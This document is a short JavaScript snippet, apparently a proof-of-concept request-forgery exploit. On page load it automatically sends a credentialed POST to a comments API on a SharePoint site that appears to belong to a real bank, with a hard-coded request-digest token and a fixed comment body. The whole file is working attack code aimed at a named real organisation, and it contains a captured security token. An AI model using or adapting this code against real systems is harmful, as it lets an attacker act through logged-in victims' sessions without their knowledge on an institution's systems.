(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
  const AUTO_RUN = true;

  function send() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', ACTION_URL, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('X-Requestdigest', '0x4306D1774C9D23610CA5A0F6827DD21F78445CC36733C622291FA8E1F34AC64F8021CA0E9B351C6CF73CE5261D08A69DD87F0ED2496A122FCF316AB8E5DBE1BE,01 Oct 2025 08:35:26 -0000');
    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');

    
    xhr.onload = function(){ console.log('status', xhr.status, xhr.responseText); };
    xhr.onerror = function(){ console.error('error'); };

    var body = '{"text":"-----23-----","mentions":[]}';

    xhr.send(body);
  }

  if (AUTO_RUN) setTimeout(()=>{ try{ send(); } catch(e){ console.error(e); } }, 50);
  else window.sendPoC = send;
})();
